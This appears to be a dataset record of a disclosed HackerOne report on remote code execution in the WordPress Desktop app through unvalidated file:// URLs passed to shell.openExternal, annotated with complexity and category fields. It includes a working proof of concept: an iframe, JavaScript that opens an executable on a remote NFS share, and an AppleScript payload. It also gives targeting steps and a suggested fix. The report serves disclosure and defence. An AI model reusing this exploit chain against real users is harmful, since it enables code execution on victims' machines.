{
    "reported_to": "Automattic",
    "reported_by": "mattaustin ",
    "title": "Remote Code Execution in Wordpress Desktop",
    "content": "\nAn attacker can create a malicious page that when viewed or edited in Wordpress Desktop App will results in remote code execution.\nThis issue looks to be around this line of code:\nhttps://github.com/Automattic/wp-desktop/blob/develop/desktop/window-handlers/external-links/index.js#L38\nIf shell.openExternal is sent a file:// url it will try to open that file in the default native application (instead of the default browser). If we pass the an a .app file on MacOS or an exe it will just execute the code.\nWe also link to a remote readable NFS mount (or windows share) to point to a remote executable.\nA Wordpress page is created with:\nCode 131 Bytes\n1<center><iframe style=\"border: 0;\" src=\"https://maustin.net/hax/wp_desktop/index.html\" width=\"250\" height=\"250\"></iframe></center>\u00a0\nThis file has the following code:\nCode 159 Bytes\n1   <script>\n2      // window.open('file:///Applications/Calculator.app');\n3      window.open('file:///net/192.241.239.91/var/nfs/general/hack2.app')\n4   </script>\nThe file at file:///net/192.241.239.91/var/nfs/general/hack2.app is a simple applescript Application with the following code:\nCode 147 Bytes\n1tell application \"Terminal\"\n2    do script \"cat /etc/hosts\"\n3    display dialog \"You just got hacked!\"\n4end tell\n5\n6do shell script \"open -a Calculator\"\nPOC\nCreate the setup described above.\nInvite any wordpress.com user to edit. (or wait for them to follow you and click on your site in the \"reader\")\nCode is executed when the user views the page.\nSee attached video for a working POC.\nSugested Fix:\nBefore passing a url to shell.openExternal the application should validate that it begins with http:// or https://.\nImpact\nAn attacker could target any individual with a wordpress.com account by inviting them to be an editor. When they simply view the page in the desktop application the code would run.\nThe remote attacker would be able to run any code as the current user on the system once the page is viewed.\nIn my testing I used a remote wordpress blog (with jetpack) so that I would be able to add an iframe. However I believe with a Business account a custom wordpress plugin could achieve the same result on a wordpress.com hosted account.\n\n",
    "severity": [
        9.0,
        10.0
    ],
    "bounty": null,
    "weaknesses": [
        "Code Injection"
    ],
    "screenshots": {},
    "disclosed_date": 1523758140,
    "report_url": "https://hackerone.com/reports/301458",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "MEDIUM",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Create a WordPress page containing a malicious iframe that points to a remote HTML file."
        ],
        [
            2,
            "The remote HTML file contains JavaScript that uses `window.open` to execute a local or remote executable file (e.g., `.app` on macOS or `.exe` on Windows)."
        ],
        [
            3,
            "When a WordPress Desktop user views or edits the page, the `shell.openExternal` function in the application processes the `file://` URL, executing the malicious file."
        ]
    ],
    "vuln_description": "The vulnerability allows remote code execution in WordPress Desktop by exploiting the `shell.openExternal` function, which does not validate URLs before processing them. An attacker can craft a malicious page that, when viewed or edited in the desktop app, executes arbitrary code on the victim's machine.",
    "reason": "The attack involves multiple components (malicious page, remote HTML, executable file) and requires understanding how `shell.openExternal` handles `file://` URLs. However, the interaction between these components is straightforward once the behavior of `shell.openExternal` is known.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null,
    "injection_metadata": {
        "is_simple_payload": false
    },
    "authnz_metadata": {
        "reason": "The vulnerability involves the WordPress Desktop App executing arbitrary code via a malicious iframe. The methodology described focuses on testing authentication and authorization boundaries within a single application by swapping user sessions and resource IDs. However, this vulnerability exploits a client-side application behavior (shell.openExternal) rather than server-side authentication or authorization flaws. The attack vector is through a malicious webpage viewed in the desktop app, which doesn't involve the typical HTTP request/response cycle or session/resource ID manipulation that the methodology tests for.",
        "is_detectable": false
    }
}